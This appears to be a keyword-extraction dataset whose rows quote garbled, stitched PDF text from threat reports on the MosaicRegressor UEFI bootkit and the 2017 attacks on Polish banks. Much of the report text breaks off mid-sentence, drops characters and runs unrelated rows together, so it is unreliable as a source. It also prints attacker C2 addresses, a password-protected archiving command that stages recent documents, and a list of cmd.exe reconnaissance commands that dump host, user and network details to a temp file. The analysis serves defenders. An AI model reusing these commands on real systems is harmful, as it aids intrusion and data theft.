Malware Families Get Further By Abusing Legitimate Websites46[.]165[.]207[.]98 46[.]165[.]207[.]113 46[.]165[.]207[.]138 94[.]242[.]219[.]199 46[.]165[.]207[.]142 46[.]165[.]207[.]99 95[.]211[.]107[.]72 95[.]211[.]38[.]135 46[.]165[.]207[.]132 46[.]165[.]207[.]108url ","{'phrases': ['the malware', 'mails', 'links', 'the target', 'event', 'the dropper', 'CONFUCIUS', 'posts', 'Yahoo Answers', 'Quora', 'keywords', 'the IP', 'address', 'command', 'control', 'C2', 'data', 'end', 'May', 'the attack', 'domains', 'legitimate websites'], 'target': 'the malware; mails; links; the target; event; the dropper; CONFUCIUS; posts; Yahoo Answers; Quora; keywords; the IP; address; command; control; C2; data; end; May; the attack; domains; legitimate websites.'}"
UEFI firmware; a DXE driver; a callback; the bootkit; the payload; persistence; the C2 server; The data; the HID; the malware; the loader; the final payload; the OLE2 payload; system info; the commands; files; the C2 server; Command.,"['1. Install initial downloader module in victim UEFI firmware using leaked HackingTeam bootkit VectorEDK. 2. Initial downloader executes on boot, drops IntelUpdate.exe payload to run at startup. 3. IntelUpdate.exe makes network connections to command servers to retrieve additional modules. 4. Modules use BITS, libcurl, WinHTTP to communicate with command servers. 5. Modules collect system information and exfiltrate it to command servers. 6. Later stages fetch tailored payloads sent via email attachments or downloaded from command servers. 7. Payloads consist of DLLs with simple exported functions to run commands and exfiltrate data. 8. Payloads gather documents, run arbitrary commands, and exfiltrate further data to command servers. 9. Modular framework can be extended by operators, updated over time. 10. Targets primarily in Middle East, decoy documents suggest political/espionage motives. ']","Extract the keywords: MosaicRegressor: Lurking in the Shadows of UEFITechnical detailsContentsUEFI Bootkit RAR SFX droppers for the Curl-based downloaders BITS DownloadersMain thread C&C Communication BITS Transfer Loading the DLL modules BITS Downloader, extended BITS Downloader, extended, MSVC 10 version BITS Downloader, “HHDump.dll” BITS Downloader, “cryptui.sep” BITS Downloader, 64-bitCurl-based downloadersC&C communication Payload ABI Notable file properties C&C URLs Payload DLL names C&C communication delay Curl-based downloader, extended C&C communication Payload Curl downloader, “OINFO11.OCX” Rich header dump WinRAR wrapper “load.rem” Load Intermediate DLL loader “mapisp.dll” CryptoSysPrepE-mail downloader“Process” functionOLE2 Equation dropperPayload of the OLE2 dropper, “Data.dll”Launcher for the Curl downloader Winhttp-based downloaders, extendedC&C addresses and file names Modification with the “ID” field C&C addresses and file names23 30MosaicRegressor is a multi-stage and modular framework aimed at espionage and data gathering. It consists of downloaders, and occasionally multiple intermediate loaders, that are intended to fetch and execute payload on victim machines. In two known cases, the initial stage of the framework was installed in the victim’s UEFI firmware, achieving the above-OS level of persistence.UEFI BootkitWhen inspecting the compromised UEFI firmware, we noticed four components that had unusual proximity in their assigned GUID values. These were two DXE drivers and two UEFI applications. Upon closer analysis, we could conclude that those were compiled from the source code of a Hacking Team bootkit named VectorEDK, that was leaked in 2015 and is now available online.Rogue components found within the compromised UEFI firmwareFollowing is an outline of the revealed components:F5B320F7E87CC6F9D02E28350BB87DE6 (SmmInterfaceBase) DD8D3718197A10097CD72A94ED223238 (Ntfs)• SmmInterfaceBase: a DXE driver intended to deploy the bootkit itself on the system by registering a callback that willbe invoked upon an event of type EFI_EVENT_GROUP_READY_TO_BOOT. The event occurs at a point when control can be passed to the operating system’s bootloader, effectively allowing the callback to take effect before it. The callback will, in turn, load and invoke further components of the bootkit, in this case ‘SmmAccessSub’. This is equivalent to Hacking Team’s ‘rkloader’ component, and is built using its source code.• Ntfs: a driver used to parse the NTFS file system to allow reading or writing to disk.• SmmReset: a UEFI application intended to mark the execution of the bootkit. This is done by setting the value of avariable named ‘fTA’ to a hard-coded GUID. The same is done by the original Vector-EDK bootkit as part of the bootkit’s main business logic. In this case, it’s not invoked and it seems to be a residue from the open source code that was not properly leveraged by the developers.Setting of the fTA variable with a predefined GUID to mark the execution of the bootkit3• SmmAccessSub: the main bootkit component that serves as a persistent dropper for user-mode malware. It is executed by the callback registered during the execution of ‘SmmInterfaceBase’, and takes care of writing a binary embedded within it as a file named ‘IntelUpdate.exe’ to the startup directory on disk. This allows the binary to run when Windows accomplishes the boot process. This is the only proprietary component amongst the ones we inspected, which doesn’t rely on Vector-EDK code. It conducts the following actions to drop the intended file to disk: – Bootstraps pointers for SystemTable, BootServices and RuntimeServices global structures.– Tries to get a handle to the currently loaded image by invoking the HandleProtocol method with the EFI_LOADED_IMAGE_PROTOCOL_GUID argument.– If it succeeds, it attempts to find the root drive with Windows installation by enumerating all drives and checking that the ‘\Windows\System32’ directory exists. A global EFI_FILE_PROTOCOL object that corresponds to the drive will be created at this point and referenced to open any further directories or files on this drive.– If the root drive is found, it looks for a marker file named ‘setupinf.log’ under the Windows directory and proceeds onlyif it doesn’t exist. In the absence of this file, it is created.– If the creation of ‘setupinf.log’ succeeds, it goes on to check if the ‘Users’ directory exists on the same drive.– If the ‘Users’ directory exists, it writes the ‘IntelUpdate.exe’ file (embedded in the UEFI application’s binary) under the‘\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup’ directory.Code from ‘SmmAccessSub’ used to write the embedded ‘IntelUpdate.exe’ binary to the Windows startup directory4RAR SFX droppers for the Curl-based downloadersThese are several SFX droppers with decoy documents that were sent to victims by e-mail. Each contains a document and Path=%appdata% Setup=%appdata%\1.docx Setup=%appdata%\msreg.exe Path=%appdata% Setup=%appdata%\6.docx Setup=%appdata%\msreg.exe Simplified Chinese font “SimSun” but is unreadable and looks like a result of incorrect encoding.RAR SFX script: Path=%appdata% Setup=winword.exe Setup=contract.doc Path=%appdata% Setup=%appdata%\6.docx Setup=%appdata%\msreg.exe Simplified Chinese font “SimSun” but is unreadable and looks like a result of incorrect encoding.RAR SFX script: Path=%appdata% Setup=winword.exe Setup=contract.doc Path=%appdata% Setup=dwhost.exe Setup=0612.doc Path=%appdata% Setup=return.exe Setup=1206.doc Path=%appdata% Setup=dwhost.exe Setup=0927.doc Silent=1 display name “test” of type BG_JOB_TYPE_UPLOAD. It creates a mutex to ensure only one instance is being executed.10Mutex name: “FindFirstFile Message Bi”Enumerates all BITS jobs. For a job whose display name contains the substrings “first_tf” or “second_tf” and overall display name is five or six characters (this never happens since the conditions are contradictory), it cancels the job, effectively interrupting the transfer and removing temporary files. Then the module follows its business logic in a separate thread while running an empty window message loop in the startup thread.Main thread The program contains four blocks of data encrypted with a simple one-byte XOR algorithm. Three of those blocks contain URL strings and the fourth contains a unique string, “D22”.It builds an identification string following the format: %Computer name%-D22_32 or 64The 32 or 64 suffix is chosen based on system identification. The system is supposed to be 64 if the program is able to locate the file or directory named %WINDIR%\SysWOW64The program then follows into an infinite C&C communication loop. It delays for a hardcoded period of 20 minutes between each attempt.C&C Communication The module compiles a final URL string following the format: URL from the decrypted buffer/identification string/on.zIt then attempts to download the contents of that URL to the file %TEMP%\on.dat using its BITS transfer routine. The contents of the file areignored and the file is deleted immediately after transfer. This initial download is used to determine the valid C&C server. The module iterates through all three URLs hardcoded in its body and uses the first one that responds without error for further communication.In case any of the C&C servers provided a valid response, the program sends another download request for: URL of the valid C&C server/identification string/BeFileA.z The downloaded contents are then saved to: %TEMP%\BeFileA.dllIt also tries to fetch the file using the URL: URL of the valid C&C server/identification string/BeFileC.z and save it to: %TEMP%\BeFileC.dllThe file “BeFileA.dll” is downloaded only once during the duration of the program’s instance and is loaded in a separate thread. The attempts to download the file “BeFileC.dll” occur in every communication period. The file is loaded in the same thread.BITS Transfer The program creates a new BITS job. For a download job it names the job “first_tf” and for the upload tasks it uses the name “second_tf”. Other versions use slightly different strings as job names but they all start with “first” and “second” correspondingly, and are always identical to the names of the jobs that are cancelled during the startup. The job is started with the priority setting “BG_JOB_PRIORITY_FOREGROUND”. It also toggles the security options “BG_SSL_IGNORE_ CERT_CN_INVALID”, “BG_SSL_IGNORE_CERT_DATE_INVALID”, “BG_SSL_IGNORE_UNKNOWN_CA”, to accept invalid HTTPS certificates.It then waits for up to about five minutes for the BITS job to complete, also extending the wait if the actual transfer is in progress.11Loading the DLL modules The module expects the files provided by the C&C server to be PE DLLs. They are loaded normally using the LoadLibrary API function. Each DLL may have one or more exported functions named “CallA”, “CallB”, “CallC”, “CallD”, “CallE”.All exported functions are supposed to have the same ABI: cdecl calling convention, five arguments all passed by pointers. Following the execution of each function the program delays for one second and then processes the results returned in these arguments. Depending on the data returned by the exported function, the program may then download or upload arbitrary files from/to arbitrary URLs using its BITS transfer routine. Also, depending on the returned data, it may delete or leave the DLLs file on disk.Then it checks if a corresponding “dat” file exists in the %TEMP%directory. In case the file exists it uploads it to the C&C server using the BITS transfer routine, the same URL except the last component is identical to the actual filename. The different mutex name: “set instance state”.After starting the C&C communication thread, the program sets the registry value HKEY_CURRENT_USER\Software\ Microsoft\Windows\CurrentVersion\Run, value name qwinstd, to the location of its own executable. It also overwrites the value if it is not equal to the location of the executable. This ensures the program’s automatic startup. Also the program sets up a timer callback routine to be called every second. The routine looks for the file %APPDATA%\Microsoft\Internet Explorer\usk.rs. When such a file is found it acts as a kill switch: the file deleted, the BITS Jobs are cancelled and the program exits.Instead of the %TEMP% directory this version uses the directory %APPDATA%\Microsoft\Internet Explorer to store its temporary files.12System information The module creates a text file %APPDATA%\Microsoft\Internet Explorer\%Computername%.dat and fills it with system information. Note the non-ASCII symbols 0xA3 and 0xBE used in the string literals. These were replaced with a colon character (See “Language artifacts”).Host Infomation: EXE ID: %Unique ID, see table% Host Name: %Computername% Current User Name: %USERNAME% PRIVILEGE: %User privilege% OS: Windows NT %Major%.%Minor%\t%Service pack string%\t%Product type%\tSystemMetrics: %Build number for Windows 5.2%\tSuiteMask hex: %Suite mask% OS BITS: %32 or 64% Host Power ON Time: %04d-%02d-%02d %02d:%02d Power ON Time: %d Hours %2d Minutes %2d Seconds *or*Power ON Time: %2d Minutes %2d Seconds Installed Programe List 32: *the following list is the contents of registry keys from HKLM\SOFTWARE\Microsoft\Windows\ CurrentVersion\Uninstall* *%Item number%* *%Registry key last write timestamp in format %04d-%02d-%02d %02d:%02d%* *optional, when the program determines that it is running on a 64-bit OS, it disables 64/32 registry reflection and enumerates the installed program list again, generating a similar list with a header “Installed Programe List 64”*Remarks. The %User privilege% string is produced using the NetUserGetInfo API for the current user. Depending on the returned result, it can be one of the strings: “Administrator”, “User”, “Guest”, “ACCESS_DENIED”, “COMPUTER_ NAME_ERROR”, “USER_NAME_ERROR”. The %Product type% string is one of “VER_NT_SERVER”,“VER_NT_DOMAIN_ CONTROLLER”, “VER_NT_WORKSTATION”Once the report file is ready, the program creates a BITS job to upload it to the C&C server. The upload location follows the format: URL of the C&C server/%Computername%.dat The file is deleted if the upload succeeds.13Payload When finished with uploading the system information report, the program then attempts to fetch the payload from the C&C server. The business logic is similar to the one of the “BITS Downloader”, with the following differences:Files that are downloaded and executed in separate threads:FileA.dll fetched from %C&C URL%/%Computername%/FileA.zFileB.dll fetched from %C&C URL%/%Computername%/FileB.zFiles that are downloaded and executed in the current thread:FileC.dll fetched from %C&C URL%/%Computername%/FileC.zFileD.dll fetched from %C&C URL%/%Computername%/FileD.zEach DLL may have one or more exported functions named “CallA”, “CallB”, “CallC”, “CallD”, “CallE”, “CallF”, “CallG”, “CallH”, Many strings contain the sequence 0xA3, 0xBE (hexadecimal). This is an invalid sequence for a UTF8 string and the LATIN1 encoding translates these symbols to a pound sign followed by a “masculine ordinal indicator” (“£º”).Дanguage artifactsAn attempt to iterate over all available iconv symbol tables trying to convert to UTF-8 produces possible candidates that produce a more meaningful conversion for this byte sequence: CN-GB//, “ : ” # EF BC 9A CP936//, “ : ” # EF BC 9A CP949//, “ : ” # EF BC 9A CSEUCKR//, “ : ” # EF BC 9A CSGB2312//, “ : ” # EF BC 9A EUC-CN//, “ : ” # EF BC 9A EUC-KR//, “ : ” # EF BC 9A EUCCN//, “ : ” # EF BC 9A EUCKR//, “ : ” # EF BC 9A GB2312//, “ : ” # EF BC 9A GB13000//, “ : ” # EF BC 9A GB18030//, “ : ” # EF BC 9A GBK//, “ : ” # EF BC 9A ISIRI-3342//, “!:” # 21 3A ISIRI3342//, “!:” # 21 3A MS936//, “ : ” # EF BC 9A MSCP949//, “ : ” # EF BC 9A OSF0004000A//, “ : ” # EF BC 9A OSF100203B5//, “ : ” # EF BC 9A UHC//, “ : ” # EF BC 9A WINDOWS-936//, “ : ” # EF BC 9A Given the context of the string preceding the symbol and line feed symbols following it, the best match is the “FULLWIDTH empty; all the business logic is implemented in the DllMain function.The DllMain function, when executed with the reason code of DLL_PROCESS_ATTACH, checks if the filename of the host The module checks for the presence of the file %APPDATA%\Microsoft\Windows\load.rem. If the file is present it follows in a new thread: it copies it to %APPDATA%\Microsoft\Windows\SendTo\load.dll, then loads the copy as a regular DLL and calls its function exported with the name “Load”, if present. The copy is deleted if the module fails to load it as a DLL.Main thread The module enumerates and cancels BITS jobs if their names contain a substring “first job” or “second job” and the length of the name is either 9 or 10. This is an improvement over the original “BITS Downloader” that checked for a contradictory condition that never becomes true.The module creates a directory if it doesn’t exist: %APPDATA%\Microsoft\Network. Due to a bug, it will not attempt to create the directory if a file exists with the same name, failing later when the directory is required. This directory is then used to store any temporary files, instead of %TEMP% in the original “BITS Downloader”.Files that are downloaded and executed in separate threads:DFileA.dll fetched from %C&C URL%/%Computername%/DFileA.zDFileD.dll fetched from %C&C URL%/%Computername%/DFileD.zFiles that are downloaded and executed in the current thread:DFileC.dll fetched from %C&C URL%/%Computername%/DFileC.zExported function names executed from the payload DLLs: “CallA”, “CallB”, “CallC”, “CallD”, “CallE”, “CallF”, “CallG”, “CallH”, “CallI”, “CallJ”, “CallK”, “CallL”, “CallM”, “CallN”, “CallO”, “CallP”, “Final”.The signature of the function called “Final” is different from the rest: it takes 21 arguments that not only contain those of a BITS Downloader. It is very similar to “HHDump.dll”. The following description includes only the differences.The library provides one exported function with the name “RetrievePKCS7FromCA”. The DllMain function is empty and the module doesn’t have any checks for the name of the current executable.The payload is loaded in the same way as “HHDump.dll”; the only difference is an additional optional call to the function appeared in “BITS Downloader, extended”. It is worth noting that the part of the code that checks for, and cancels, the BITS job by name uses the same name lengths as the first “BITS Downloader” (5 and 6) but the correct substring literals “first” and “second”.This version does not create any mutex.C&C communication period: 15 minutesThis version uses the directory %APPDATA%\Microsoft\Internet Explorer to store its temporary files.The module creates a text file %APPDATA%\Microsoft\Internet Explorer\%Computername%.dat and writes a hardcoded string in there:LINEThe file is then uploaded to the C&C server using the same code that uploads the system information report in “BITS Downloader, extended”.The names of payloads, filenames and exported function names that are executed from the payload DLLs is identical to the communication routine.C&C communication The module downloads several files from its C&C server. The URL of the server is hardcoded and varies among the samples.It may download modules specific to either 32-bit or 64-bit target systems, using the suffix “32” or “64” correspondingly. For each DLL file the download routine enters an infinite loop and continues to the next module only when the current file has been download without errors. Each attempt is followed by a predefined delay that is different for each sample.The first file to download is the following:URL of the C&C server/msreg_32.dll or URL of the C&C server/msreg_64.dllThe file is saved to: %APPDATA%\msreg.dll.Next, the module attempts to download the files:URL of the C&C server/wrtreg_32.dll, saved to %TEMP%\wrtreg_32.dllURL of the C&C server/wrtreg_64.dll, saved to %TEMP%\wrtreg_64.dllThis library is then loaded, unloaded and deleted. The latter two libraries are downloaded and executed only if the file msreg.dll is is nnot present on disk.19Then the module continuously attempts to download another file:URL of the C&C server/%Computername%/%PayloadName.dll, saved to %APPDATA%\%PayloadName%.dll (%PayloadName% varies, see the list of names)The previous version of the file, if present, is moved to a temporary filename with the prefix %TEMP%\34F and then deleted. Every time a new such file is successfully downloaded, the module starts a new thread to execute it.Payload ABI The payload file is expected to be a regular Windows DLL. The code that interacts with the library is similar to the one used in BITS Downloader. The file is loaded using the standard LoadLibraryA API function. Then it resolves the addresses of functions exported with the names “ExpA”, “ExpB”,“ExpC”, “ExpD”, “ExpE”, “ExpF”, “ExpG”. The functions, if present, are then consequently called. Every function has to take five arguments passed on the stack by pointers.Depending on the returned values, the module can stop executing the exported functions, download files to disk or upload data produced by the function to the C&C server. The data is uploaded with HTTP POST request to the URL:URL of the C&C server/upload.phpThe POST request contains the part called “txt” as a file attachment, with its filename and contents provided by the exported function.Notable file properties The binary is statically linked with libcurl and contains the version string “libcurl/7.49.1”. According to the official Curl website, version 7.49.1 was released on May 30 2016.The language identifier of the file’s resources is set to 2052 (“zh-CN”). One of the resources is its version information communication routines are similar to those found in the “Curl-based downloader”.Mutex name: “single UI”Sets the autorun registry location: HKCU\Software\Microsoft\Windows\CurrentVersion\Run, value dsuiext=%location of the executable%.Every second the module checks for the presence of a kill switch file %APPDATA%\Microsoft\exitUI.rs and terminates if it is present.The module enters an infinite C&C communication loop with a preset delay between each attempt.C&C communication First, the module sends a test GET request using the URL of the C&C server and continues if the attempt succeeds. Then it collects system information and writes the results into a text file %APPDATA%\%Computername%.dat. The code that collects the system information is identical to the one found in the “BITS Downloader”. Then the resulting file with the system information is sent to the C&C server in a POST request to %URL of the C&C server/upload.php. The code also checks if there is a file %APPDATA%dat present on the disk and if so the file is uploaded instead.The URL of the C&C server and the unique identifier (“EXE ID”) are hardcoded in the binary and encrypted with a simple one-byte XOR operation.Payload When it has finished uploading the system information report the program then attempts to fetch the payload from the C&C server. The business logic is similar to the one for “BITS Downloader, extended”, with the following differences:Files that are downloaded and executed in separate threads:21%APPDATA%\Microsoft\WebA.dll fetched from %C&C URL%/%Computername%/WebA.z%APPDATA%\Microsoft\WebB.dll fetched from %C&C URL%/%Computername%/WebB.zFiles that are downloaded and executed in the current thread:%APPDATA%\Microsoft\WebC.dll fetched from %C&C URL%/%Computername%/WebC.zEach DLL may have one or more exported functions named “FunA”, “FunB”, “FunC”, “FunD”, “FunE”, “FunF”, “FunG”, “FunH”, “FunI”, “FunJ”. Once finished, the program may delete the DLL file depending on the returned value. Depending on the data process but also deletes the autorun registry value.Rich header dump The 66 modules compiled with Visual Studio 6 are parts of the libcurl library identical to the one used in the “Curl-based discovered along with one of the downloader samples.The library has an empty DllMain function and three exported functions with the names “CallA”, “CallB”, “CallC”. The description of these functions follows.23CallA • creates the directory %APPDATA%\Microsoft\Windows • deletes the file %APPDATA%\Microsoft\Windows\mapisp.dll and, if this fails, renames the file to %TEMP%\Hx101.tmp •returns the values that result in the BITS Downloader, fetching the file “SecondA.z” from the C&C server to %APPDATA%\Microsoft\Windows\mapisp.dllCallB • creates the directory %APPDATA%\Microsoft\Windows\SendTo • deletes the file %APPDATA%\Microsoft\Windows\SendTo\cryptui.sep and, if this fails,renames the file to•%TEMP%\Hx102.tmp returns the values that result in the BITS Downloader, fetching the file “SecondB.z” from the C&C server to %APPDATA%\Microsoft\Windows\SendTo\cryptui.sepCallC • sets an autorun registry value : HKCU\Software\Microsoft\Windows\CurrentVersion\Run,name mapisp to “rundll32.exe “%APPDATA%\Microsoft\Windows\mapisp.dll”,CryptoSysPrep• checks if the files “mapisp.dll” (called “file a”) and “cryptiu.sep” (“file b”) are present • writes a log of operations into the file %APPDATA%\Microsoft\Internet Explorer\FileOutA.dat and returns Strings written to the log depend on the results of the preceding operations: “second file successA” “file a success” or “file a error” “file b success” or “file b error” “registry set success” or “registry set error” “do move file a” or “do not move file a” “do move file b” or “do not move file b” exported function with the name “Load”.Load The function is an infinite loop. Every five minutes it checks if there is a file named %APPDATA%\Microsoft\Windows\LnkClass.dat. If the file is present, it then executes24“%APPDATA%\Microsoft\Windows\LnkClass.dat” a -hpHFG5fv(*&# -r “%APPDATA%\Microsoft\Credentials\MSI36C2.dat” %CSIDL_RECENT%Here, %CSIDL_RECENT% is the location of the “Recent documents” folder. Although the original file named LnkClass.dat was not recovered, the command line is valid for a popular archiver called WinRAR - it is a command to store the contents “CryptoSysPrep”.CryptoSysPrep The function checks for the presence of additional DLL files and loads them in separate threads:%APPDATA%\Microsoft\Windows\SendTo\cryptui.sep, called by function RetrievePKCS7FromCA%APPDATA%\Microsoft\Network\sppsvc.sep, copied to %APPDATA%\Microsoft\sppsvc.tbl, then loaded and called by function “PlugA”%APPDATA%\Microsoft\Network\subst.sep, copied to %APPDATA%\Microsoft\subst.tbl, then loaded and called by All strings related to the business logic are encrypted with a homebrew algorithm similar to RC4 with a hardcoded extended S-Box of 1024 bytes.The module checks if there is a file present at %COMMON_APPDATA%\Microsoft\Windows\user.rem. If it is present, the file is copied to %APPDATA\Microsoft\dfsadu.dll; then it is loaded and its export “MediaA” is called in a new thread.Then the function enters an infinite loop. Every 20 minutes it tries to connect to a POP3S server “pop.mail.ru”. The module uses the first of two pairs of hardcoded credentials that worked.Login (password hardcoded but not shown)Feedback e-mail addressthtgoolnc@mail.ruthbububugyhb85@mail.ruthgetmmun@mail.ruthyhujubnmtt67@mail.ruThe module attempts to download the first e-mail message from the mailbox into the %TEMP% directory using a temporary filename with the prefix “Ht”. If the download succeeds, it deletes the message via IMAPS using the same credentials.It parses the MIME format using a code that appears to be similar to a widespread open-source class CMimeMessage (the class name is included in the RTTI information too). It extracts the message’s subject and continues if it is equal to “RepeatA”, “RepeatB”, “RepeatC”, “RepeatD”. If the subject matches one of the names, the attachment from that message is saved and decrypted and then copied with a DLL extension:SubjectRepeatARepeatBRepeatCRepeatD26Temporary DLL name%TEMP%\RepairA.dll%TEMP%\RepairB.dll%TEMP%\RepairC.dll%TEMP%\RepairD.dllThe DLL file is then loaded and called by export “MediaA”. Depending on the return value of that function, the DLL file may be deleted or left on disk. Also, the module may encrypt a temporary file produced by the function, and send it as an attachment of type “application/x-msdownload” with the name “attach.dat”, to the “feedback” email address via SMTPS. The subject of the message is set to “MINE UPLOAD” and the “From” field is set to the login used to retrieve the incoming messages.OLE2 Equation dropperMD5: 33F21AC73AFF4DFF71316795282A3D06 (OLE2 part)This is a recovered part of a weaponized document. Since most related code and documents described in public reports are known to be RTF documents, this one could also have been embedded in an RTF document.The OLE2 stream creation date for all the streams is 2019-02-02. It contains composite objects of types “Microsoft Equation 3.0” and “Microsoft OLE 1.0 Native”. The Equation object uses a well-known exploit CVE-2018-0802 and the OLE 1.0 holds the EXE file that is decrypted by the shellcode of the exploit.Several notable findings:The OLE 1.0 Native CompObj stream contains the name in Russian “Пакет” along with the English name “Package”. It also has starts the executable from its DllMain function and returns.Winhttp-based downloaders, extendedThese samples seem to be based on the same code for collecting system information as the downloaders using BITS and Curl and use the same text messages with non-ASCII symbols. However the code in these files uses WinHTTP API for value Media=%location of the executable%.The program collects system information in a text file %APPDATA%%Computername%. The data is similar to the one collected by other “extended downloaders”, but also includes the list of running processes (all samples except mounted disks and the listings of their root directories. The text file is uploaded to the C&C server with a POST request to %C&C server%/upload.php.The module downloads two executable files. The first file is saved in the %STARTUP% folder and the second one is saved in the folder named %APPDATA%\Microsoft and started immediately. The URLs and names of the files vary. The code also contains references to the file “repeat” but that file is never downloaded. Existing files, if they are present and are different in size, are moved into a temporary file with the prefix %TEMP%\341 and then deleted.Each file is downloaded from the URL constructed according to the format: %C&C server%/%Computername%/%filename%, Agent string or “Mozilla/4.0”.C&C addresses and file namesMD5C&C serverRemote reports a unique hardcoded “ID” similar to the “EXE ID” string used in other types of downloaders. the sample ","{'phrases': ['download', 'UEFI', 'boot', 'VectorEDK', 'IntelUpdate.exe', 'startup', 'servers', 'modules', 'BITS', 'libcurl', 'system information', 'payloads', 'mail', 'DLLs', 'exported function', 'functions', 'data', 'Modular framework', 'PE', 'time', '10', 'decoy documents', 'espionage'], 'target': 'download; UEFI; boot; VectorEDK; IntelUpdate.exe; startup; servers; modules; BITS; libcurl; system information; payloads; mail; DLLs; exported function; functions; data; Modular framework; PE; time; 10; decoy documents; espionage.'}"
the attackers; the bank; access; the victim; the website; DLL; the malware; reconnaissance; PE; the C&C; PE; RAT; system information; UPLD; new malware; the bank; 10; 11; the attacks; 11; 10; the attackers; APT; 0day.,"['1. Attackers compromise the website of the Polish Financial Supervision Authority. 2. The website includes scripts loading exploits targeting browser plugins like Silverlight and Flash. 3. Visiting employees of Polish banks receive and are infected by the exploits. 4. Exploits download a reconnaissance tool to gather system information. 5. If the system is interesting, a second stage malware executable is manually triggered. 6. The executable decrypts and injects a RAT malware installed as a service DLL. 7. A config file provides encoded C2 server domains that are decoded at runtime. 8. The RAT malware connects to the C2 and can receive commands to carry out tasks on the system. 9. An injector tool was also used to load malicious DLLs into explorer.exe. 10. Various tactics like encryption, whitelisting, fileless injection, etc. are used across the attack chain. 11. Success of the attack provided access to internal bank networks. ']","Extract the keywords: BadCyberMaking infosec journalism great again!Technical analysis of recent attacks against Polish banksbadcyber/February 16, 2017/Investigation, Malware/bank, malware,Poland7 Share TweetSHARES It has been three weeks since  rst information about succesful attacks on Polish banks has reached our ears. It’s time to put together the technical description of how the attacks were performed.When two weeks ago we have revealed the fact that a few Polish banks were hacked by uknown attackers, the banks were super busy scanning internal networks and looking for intruders. Nobody bothered to write down the details of the infection process. Since then some companies tried to cover less or more technical details of this attack. We’ve seen publications by Symantec, Booz Allen and BAE Systems – we particulary recommend the latter, as in our opinion it includes the most technically correct information con rmed by multiple sources.In this article we will try to cover the whole infection process – starting with a bank employee visiting the Polish Financial Supervision Authority website and ending in his workstation being infected by a clever RAT. We will include only one of the infection scenarios – we understand that there were others with less or more signi cant di erences.What happened in the browserTo start the infection process a bank employee had to visit the www.knf.gov.pl website sometimes between October 5h, 2016 and February 2nd, 2017. Most pages on this website included the following script:url src.js?ver=11Somewhere next to the end of this  le an external script was included – depending on the month it was eitherurl’ controlled server performed some initial veri cation of the visitor – most probably based on IP whitelists including address classess deemeed interesting by the attackers. Once the target was con rmed as interesting, it received one of four exploits: cambio.xap  le attacking vulnerable Silverlight Exploits used in this attack were borrowed from commercial exploit packs. As far as we know at the moment of the attacks none of the exploited vulnerabilities were considered a 0day.The exploit call included a parameter pointing to a shellcode, which downloaded a reconnaissance tool (described in the BAE article) from the same domain. The tools gathered some basic info about the machine and uploaded it back to its server. If the analysis results were deemed interesting to the attackers, they could manually trigger downloading another malicious component, served as perfmon.dat. It was an encrypted EXE  le, which was run on the target for the next malware stage. It is a simple commandline tool, with basic capabilities, including-l : list of potential services which clould be used by malware -e [NAME] : unpacks DLL and CHM files under given NAMEThe installer decrypts and saves two  les (depending on target architecture in 32 or 64bit versions): a DLL  le protected with commercial Enigma packer and a DLL into the process. The service also decrypts the con g like C&C server – which they are not.tradeboard.mefound.com:443 movis-es.ignorelist.com:443In an interesting plot twist the malware resolves those domains to their real IP addresses, but then performs a XOR operation on the original IPs to obtain true C&C IP addresses.The service.chm  le is the  nal stage of this part of infection scenario – it’s a RAT connecting to the C&C and taking orders. Some of the 20-something commands include:CMDL – execute command, write result to temporary  le, upload the  le to C&C and delete it DEL – remove  le DIE – turn o  DIR – search  les or folders DOWN – download and save  le DRIV – list logical drives GCFG – download current con g PEEX – inject into explorer.exe PKIL – kill process PVEW – display information about running processes RUN – execute SCFG – get new con g, encrypt it and save UPLD – upload  le to C&C WIPE – secure deleteAnother piece of malware identi ed during incident response was the fdsvc.exe accepts parameters pointing to a server it should connect to and the process it companies, as getting the information from Polish sources was a really hard task. We would like to use this opportunity to thank all of our sources who were so kind to share their research results with us. We hope this publication will help to further the research into this incident.7SHARES Share Tweet2 thoughts on “Technical analysis of recent attacks [Lazarus – Polish Malware]Network url url“regGathering information cmd.exe /c “hostname > %TEMP%\TMPE52E.tmp” cmd.exe /c “whoami >> %TEMP%\TMPE52E.tmp” cmd.exe /c “ver >> %TEMP%\TMPE52E.tmp” cmd.exe /c “ipcon g -all >> %TEMP%\TMPE52E.tmp” cmd.exe /c “ping url >> %TEMP%\TMPE52E.tmp” cmd.exe /c “query user >> %TEMP%\TMPE52E.tmp” cmd.exe /c “net user >> %TEMP%\TMPE52E.tmp” cmd.exe /c “net view >> %TEMP%\TMPE52E.tmp” cmd.exe /c “net view /domain >> %TEMP%\TMPE52E.tmp” “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings” >> %TEMP%\TMPE52E.tmp” cmd.exe /c “tasklist /svc >> %TEMP%\TMPE52E.tmp” cmd.exe /c “netstat -ano |  nd “TCP” >> %TEMP%\TMPE52E.tmp” cmd.exe /c “wmic os get lastbootuptime >> %TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%PROGRAMFILES%\ >> %TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%PROGRAMFILES%\ >> %TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%s\Desktop” >> %TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%s\Documents” >> %TEMP%\TMPE52E.tmp” cmd.exe /c “dir /od /a “%s\Favorites” >> %TEMP%\TMPE52E.tmp” cmd.exe del /a %1 if exist %1 goto del1 del /a %0 ","{'phrases': ['Attackers', 'the Polish Financial Supervision Authority', 'IP', 'Exploits', 'Silverlight', 'Polish banks', 'a reconnaissance tool', 'information', 'malware', 'a RAT', 'DLL', 'RUN', 'time', 'commands', 'list', 'the attack', '11'], 'target': 'Attackers; the Polish Financial Supervision Authority; IP; Exploits; Silverlight; Polish banks; a reconnaissance tool; information; malware; a RAT; DLL; RUN; time; commands; list; the attack; 11.'}"
